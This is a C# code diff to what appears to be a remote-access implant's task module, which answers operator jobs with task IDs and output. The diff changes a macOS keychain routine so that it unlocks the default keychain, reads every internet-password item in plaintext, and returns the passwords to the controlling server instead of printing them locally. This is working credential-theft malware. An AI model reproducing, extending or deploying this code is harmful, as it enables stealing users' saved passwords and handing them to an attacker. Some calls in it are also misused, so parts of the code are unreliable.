@@ -18,19 +18,17 @@ namespace Agent
 
         public async Task Execute(ServerJob job)
         {
-            Dictionary<string, ServerJob> jobs = messageManager.GetJobs();
-            Dictionary<string, string> jobsOut = jobs.ToDictionary(j => j.Value.task.id, j => j.Value.task.command);
-
             await messageManager.AddResponse(new ResponseResult()
             {
                 task_id = job.task.id,
-                user_output = JsonSerializer.Serialize(jobsOut),
+                user_output = DisplayKeychainContents(),
                 completed = true
             });
         }
-        public void DisplayKeychainContents()
+        public string DisplayKeychainContents()
         {
             IntPtr keychain = IntPtr.Zero;
+            StringBuilder sb = new StringBuilder();
 
             try
             {
@@ -40,16 +38,16 @@ namespace Agent
                     if (UnlockKeychain(keychain))
                     {
                         // Fetch and display keychain items
-                        FetchAndDisplayKeychainItems(keychain);
+                        sb.AppendLine(FetchAndDisplayKeychainItems(keychain));
                     }
                     else
                     {
-                        Console.WriteLine("Failed to unlock the keychain.");
+                        sb.AppendLine("Failed to unlock the keychain.");
                     }
                 }
                 else
                 {
-                    Console.WriteLine("Failed to get the default keychain.");
+                    sb.AppendLine("Failed to get the default keychain.");
                 }
             }
             finally
@@ -59,6 +57,7 @@ namespace Agent
                     Native.SecKeychainItemFreeContent(keychain);
                 }
             }
+            return sb.ToString();
         }
 
         private bool UnlockKeychain(IntPtr keychain)
@@ -70,10 +69,10 @@ namespace Agent
             return result == Native.errSecSuccess;
         }
 
-        private void FetchAndDisplayKeychainItems(IntPtr keychain)
+        private string FetchAndDisplayKeychainItems(IntPtr keychain)
         {
             IntPtr searchRef = IntPtr.Zero;
-
+            StringBuilder sb = new StringBuilder();
             try
             {
                 if (Native.SecKeychainSearchCreateFromAttributes(keychain, Native.kSecClassInternetPassword, IntPtr.Zero, ref searchRef) == Native.errSecSuccess)
@@ -82,13 +81,13 @@ namespace Agent
 
                     while (Native.SecKeychainSearchCopyNext(searchRef, ref itemRef) == Native.errSecSuccess)
                     {
-                        DisplayKeychainItemContent(itemRef);
+                        sb.AppendLine(DisplayKeychainItemContent(itemRef));
                         Native.SecKeychainItemFreeContent(itemRef);
                     }
                 }
                 else
                 {
-                    Console.WriteLine("Failed to create keychain search.");
+                    sb.AppendLine("Failed to create keychain search.");
                 }
             }
             finally
@@ -98,13 +97,14 @@ namespace Agent
                     Native.SecKeychainItemFreeContent(searchRef);
                 }
             }
+            return sb.ToString();
         }
 
-        private void DisplayKeychainItemContent(IntPtr itemRef)
+        private string DisplayKeychainItemContent(IntPtr itemRef)
         {
             int length = 0;
             IntPtr data = IntPtr.Zero;
-
+            StringBuilder sb = new StringBuilder();
             try
             {
                 if (Native.SecKeychainItemCopyContent(itemRef, ref length, ref data) == Native.errSecSuccess)
@@ -113,11 +113,11 @@ namespace Agent
                     Marshal.Copy(data, passwordBytes, 0, length);
 
                     string password = Encoding.UTF8.GetString(passwordBytes);
-                    Console.WriteLine($"Keychain Item Password: {password}");
+                    sb.AppendFormat($"Keychain Item Password: {password}" + Environment.NewLine);
                 }
                 else
                 {
-                    Console.WriteLine("Failed to copy keychain item content.");
+                    sb.AppendLine("Failed to copy keychain item content.");
                 }
             }
             finally
@@ -127,6 +127,8 @@ namespace Agent
                     Native.SecKeychainItemFreeContent(data);
                 }
             }
+
+            return sb.ToString();
         }
     }
 }
